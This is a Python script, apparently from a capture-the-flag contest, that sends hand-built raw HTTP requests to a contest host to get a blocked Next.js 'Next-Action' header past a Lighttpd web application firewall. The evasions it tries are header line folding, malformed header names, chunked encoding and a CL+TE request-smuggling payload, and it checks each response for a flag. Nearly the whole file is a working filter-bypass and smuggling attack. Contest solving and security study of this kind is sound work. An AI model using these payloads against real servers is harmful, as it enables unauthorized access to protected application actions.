#!/usr/bin/env python3
"""More aggressive WAF bypass attempts.

Key observations:
- Lighttpd rejects 'Next-Action ' (trailing space), '\t', NUL.
- 'Next_Action' (underscore) goes through but Node.js won't read it as 'Next-Action'.
- Line folding ' Next-Action' on second line maybe goes through; need to check Node parsing.

New ideas:
1. HTTP/2 header smuggling (HTTP/2 ALLOWS ':authority' / pseudo-headers; what about 'next-action' with HTTP/2 ?
2. Send the action ID via Accept-Language / X-Forwarded-Action with header rewriting on the proxy. Probably no rewriting.
3. Lighttpd may rewrite something via mod_setenv or similar.

Actually the most promising: Use HTTP/2 connection coalescing via SETTINGS frames isn't easy.

Let's try: send 'next-action' in different positions, with extra colons, etc.
"""
import socket, ssl, sys

HOST = "funicular-gm2cxozn.alfactf.ru"
PORT = 443
ACTION_ID = "40c6382106bb726484f31b3ebc21b7476819a1cccf"


def send(payload, label):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    s = socket.create_connection((HOST, PORT), timeout=15)
    s = ctx.wrap_socket(s, server_hostname=HOST)
    s.sendall(payload)
    chunks = []
    try:
        s.settimeout(10)
        while True:
            data = s.recv(8192)
            if not data:
                break
            chunks.append(data)
            if len(b"".join(chunks)) > 32768:
                break
    except (TimeoutError, socket.timeout):
        pass
    finally:
        try:
            s.close()
        except Exception:
            pass
    full = b"".join(chunks)
    head = full[: full.find(b"\r\n\r\n")] if b"\r\n\r\n" in full else full[:300]
    body = full[full.find(b"\r\n\r\n") + 4:] if b"\r\n\r\n" in full else b""
    print(f"\n=== {label} ===")
    print(head[:300].decode("utf-8", "replace"))
    if b"alfa{" in body:
        i = body.find(b"alfa{")
        print(">>> FLAG:", body[i:i+200].decode("utf-8", "replace"))
    if b'"restored":true' in body:
        print(">>> RESTORED!")
    elif b'"restored":false' in body:
        pass
    return full


body = b"[]"

# 1. Folded Next-Action
hdr = "X-Anything: filler\r\n\tNext-Action: " + ACTION_ID
req = (
    f"POST / HTTP/1.1\r\n"
    f"Host: {HOST}\r\n"
    f"{hdr}\r\n"
    f"Content-Type: text/plain;charset=UTF-8\r\n"
    f"Content-Length: {len(body)}\r\n"
    f"Connection: close\r\n\r\n"
).encode() + body
send(req, "Folded with TAB")

# 2. Folded with space
hdr = "X-Anything: filler\r\n  Next-Action: " + ACTION_ID
req = (
    f"POST / HTTP/1.1\r\n"
    f"Host: {HOST}\r\n"
    f"{hdr}\r\n"
    f"Content-Type: text/plain;charset=UTF-8\r\n"
    f"Content-Length: {len(body)}\r\n"
    f"Connection: close\r\n\r\n"
).encode() + body
send(req, "Folded with space")

# 3. Send as part of Cookie/value
hdr = "Cookie: foo=bar\r\nNext-Action: " + ACTION_ID
# Equivalent to normal (already blocked)

# 4. Using header name as literal but with chunked TE
chunked = b"4\r\n[]  \r\n0\r\n\r\n"
req = (
    f"POST / HTTP/1.1\r\n"
    f"Host: {HOST}\r\n"
    f"Next-Action : {ACTION_ID}\r\n"
    f"Content-Type: text/plain;charset=UTF-8\r\n"
    f"Transfer-Encoding: chunked\r\n"
    f"Connection: close\r\n\r\n"
).encode() + chunked
send(req, "Chunked + space-suffix Next-Action")

# 5. Use HTTP smuggling via duplicate CL/TE
req = (
    f"POST / HTTP/1.1\r\n"
    f"Host: {HOST}\r\n"
    f"Content-Length: 0\r\n"
    f"Transfer-Encoding: chunked\r\n"
    f"Connection: close\r\n\r\n"
    f"0\r\n\r\n"
    # Smuggled second request
    f"POST / HTTP/1.1\r\n"
    f"Host: {HOST}\r\n"
    f"Next-Action: {ACTION_ID}\r\n"
    f"Content-Type: text/plain;charset=UTF-8\r\n"
    f"Content-Length: 2\r\n\r\n"
    f"[]"
).encode()
send(req, "HTTP smuggling CL+TE")

# 6. Try the well-known h2c upgrade (probably won't work over TLS)
# 7. Send multiple Next-Action with different names that map similarly
hdr = f"Next-Action;: {ACTION_ID}"
req = (
    f"POST / HTTP/1.1\r\n"
    f"Host: {HOST}\r\n"
    f"{hdr}\r\n"
    f"Content-Type: text/plain;charset=UTF-8\r\n"
    f"Content-Length: 2\r\n"
    f"Connection: close\r\n\r\n"
    f"[]"
).encode()
send(req, "Next-Action; with semicolon")
